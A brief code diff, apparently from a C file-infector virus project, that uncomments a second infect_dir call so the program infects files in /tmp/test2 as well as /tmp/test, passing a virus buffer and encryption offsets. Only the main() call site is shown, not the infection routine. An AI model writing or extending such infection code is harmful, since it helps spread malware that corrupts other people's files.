@@ -56,6 +56,6 @@ int main(int ac, char **av){
 			opt.is_remote = TRUE;
 	}
 	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
-	//infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
+	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
 	return 0;
 }
